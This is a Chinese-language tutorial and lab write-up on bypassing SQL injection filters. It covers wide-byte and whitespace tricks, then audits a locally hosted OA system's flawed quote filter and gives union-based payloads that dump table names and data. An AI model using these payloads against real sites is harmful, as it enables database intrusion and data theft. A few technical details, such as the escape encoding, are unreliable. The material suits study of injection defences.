SQL注入绕过  
注入绕过  
绕过单（双）引号转义注入  
常见的转义函数  
使用宽字节绕过，在使用单（双）引号注入时，在其前面加入“%df”与即将产生的“%25”（/）转义符编码成为一个宽字节字符从而成功吃掉转义符，释放单（双）引号成功注入。  
如select  *from test where id=’1’  
Payload: id=1%df’ order by 3#  
注入语句被转义为：select*  from test where id=’1%df%25’ order by 3#’  
这里的order by 部分即可以由我们控制从而进行爆库等操作。

过滤空格使用%0d进行绕过  
如select  *from test where id=’1’  
Payload:id=1’%0dorder%0dby%0d3#  
注入语句为：select*  from test where id=’1’ %0dorder%0dby%0d3#  
通过%0d将空格进行替换成功注入完整的sql注入语句

常用函数  
（1）and 等价于 &amp;&amp;  
（2）or 等价于 ||  
（3）union select 等价于 union all select  
（4）ascii()函数返回字符串的ascii值  
（5）length（）函数返回字符串的长度  
（6）substr(x,y,z)函数，取x字符串的y到z位进行返回

获取数据库名称的方法介绍  
（1） 使用database()函数直接返回数据库名  
（2） Id=1’ and (select count(\*) from xxx)&gt;0 and ‘1’=’1当查询的xxx表不存在时返回的错误信息为某某数据库的xxx表不存在，既可以得到数据库的名称。  
数据库系统中的特定数据库介绍  
（1）mysql数据库的information\_schema库介绍  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2b89529124f64dadfb42b3a06ef98875612dab20.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2b89529124f64dadfb42b3a06ef98875612dab20.png)  
其中的TABLES表保存了整个数据库系统的数据库与对应的表名，即是在该表中可以通过数据库名查询到其所有的表名  
COLUMNS表保存了所有的表的所有列名，通过对应的表名查询到该表的所有列名

（2）针对MySQL5.6或更高的版本  
在注入时可以使用sys默认库中的视图代替information\_schema数据库的作用  
查看sys库的视图  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-204b7b8fc85efe78d1daae390f066b9d826d4ad8.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-204b7b8fc85efe78d1daae390f066b9d826d4ad8.png)  
在该视图中的table\_schema与table\_name分别为数据库名字以及该数据库所拥有的表名

绕过常见过滤函数进行注入  
工具  
Phpstudy  
Seay  
实践过程  
（1） 使用phpstudy搭建目标环境并手工测试发现注入点  
通过手工测试发现在多个位置下可能存在了sql注入  
报错地址1，需要登录  
[http://127.0.0.1:8085/manage/qingjia.php?action=list&amp;page=1&amp;limit=15&amp;suserxm=&amp;sniandu=1&amp;smudidi=&amp;sjiabie](http://127.0.0.1:8085/manage/qingjia.php?action=list&page=1&limit=15&suserxm=&sniandu=1&smudidi=&sjiabie)=  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7cdb4580d0cea882e1ccade5a5f04572941e4884.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7cdb4580d0cea882e1ccade5a5f04572941e4884.png)  
在sniandu=1后面添加单引号报错  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-dbb46720da595e80c6e0c6106d2cd0346e3011b7.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-dbb46720da595e80c6e0c6106d2cd0346e3011b7.png)

报错地址2，不需要登录的地址：  
[http://127.0.0.1:8085/Api/getlist.php?action=zidian&amp;fenlei=%E6%94%BF%E6%B2%BB%E9%9D%A2%E8%B2%8C](http://127.0.0.1:8085/Api/getlist.php?action=zidian&fenlei=%E6%94%BF%E6%B2%BB%E9%9D%A2%E8%B2%8C)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f56bd4d3af13ea5906cd05a3bdc45e1badf246f2.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f56bd4d3af13ea5906cd05a3bdc45e1badf246f2.png)  
在分类后面添加单引号报错  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-992207d29c61e33fae8b20a3b8a4a64adc1881b2.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-992207d29c61e33fae8b20a3b8a4a64adc1881b2.png)

（2） 在看到报错以后看到了希望，便使用sqlmap来跑一波，奈何显示存在注入却无法得到数据。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1c4d6fb0447b020d929df82c9483f11f271e2990.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1c4d6fb0447b020d929df82c9483f11f271e2990.png)  
于是猜想存在过滤，使得无法获得数据  
（3） 进行源码分析  
通过跟踪数据包发现输入的fenlei参数直接组合成为数据库的sql语句带入fetchall()方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d355b3d2e5523078e580f99c4e7b28e2c8a60bdb.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d355b3d2e5523078e580f99c4e7b28e2c8a60bdb.png)  
跟踪fetchall方法，发现将sql语句使用prepare（）方法进行处理后在返回。继续向上跟踪到prepare（）方法。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d60509e233ce5f80464b7603bc4bd13661a4fd77.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d60509e233ce5f80464b7603bc4bd13661a4fd77.png)  
找到prepare函数查看得到sqlsafe为使用checkquery过滤过的安全sql语句。继续向上查找checkquery()方法。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0e2828cf746c2b0a25c82d61c4736681d6e8c5c5.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0e2828cf746c2b0a25c82d61c4736681d6e8c5c5.png)  
找到checkquery（）方法，可以看到该处对输入的sql语句进行了过滤，首先进行一些简单处理。在输入的sql查询语句中检查是否存在禁用的函数，禁用的操作符，以及是否使用了注释等操作符。  
其中定义的禁用的函数，禁用的操作符，以及注释符号分别为  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ef82f913f02072261765986e33b0712e244785c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ef82f913f02072261765986e33b0712e244785c4.png)  
可以看到这里禁用了绝大部分的注入所用的符号及函数操作。  
过滤失误之处  
对引号的过滤存在问题，使得返回报错的信息。  
if (strpos($sql, '/') === false &amp;&amp; strpos($sql, '#') === false &amp;&amp; strpos($sql, '-- ') === false &amp;&amp; strpos($sql, '@') === false &amp;&amp; strpos($sql, '`') === false) {  
$cleansql = preg\_replace("/'(.+?)'/s", '', $sql);  
} else {  
$cleansql = self::stripSafeChar($sql);  
}  
实操绕过进行注入  
爆库名  
Payload：' and (select count(*) from sysobjects)&gt;0 and '1'='1  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fc603c20e3e3efc8f5be1c9e2db2919296ca98d9.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fc603c20e3e3efc8f5be1c9e2db2919296ca98d9.png)  
爆表名，使用union all select 绕过union select 的过滤。  
Payload：' union all select 1,2,3,4,GROUP\_CONCAT(table\_name) from sys.schema\_index\_statistics where table\_schema="db\_oasystem" and '1'='1  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4c4791d50240a312bcc7e3ffe50ca7f3890d1e56.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4c4791d50240a312bcc7e3ffe50ca7f3890d1e56.png)  
判断列数，通过修改倒数第二个select的查询列数报错查看列数  
Payload：' union all select 1,2,3,4,(select 1 from (select 1,2,3,4 union all select*  from tb\_danwei)a limit 1,1) and '1'='1  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-af12492b04e42d5a6a739aa4eac65c6c458ef373.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-af12492b04e42d5a6a739aa4eac65c6c458ef373.png)  
获取表中的数据，通过修改GROUP\_CONCAT中自定义的列名获取数据。  
Payload：' union all select 1,2,3,4,GROUP\_CONCAT(z) from (select 1 as 'x',2 as 'y',3 as 'z' union all select \* from tb\_danwei)tpl where '1'='1  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-87040c6a109b771c023673500a0901eeaf91b589.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-87040c6a109b771c023673500a0901eeaf91b589.png)  
总结  
本次测试主要的思路为首先发现疑似注入点，在使用常规手段依然获取不到数据的情况下使用特定的一些语句进行数据的注入获取，其中利用到了mysql5.6及更高版本数据库系统下的sys库视图，使用等效函数绕过过滤，以及如何在不知道列名的情况下使用多表联合查询获取数据等。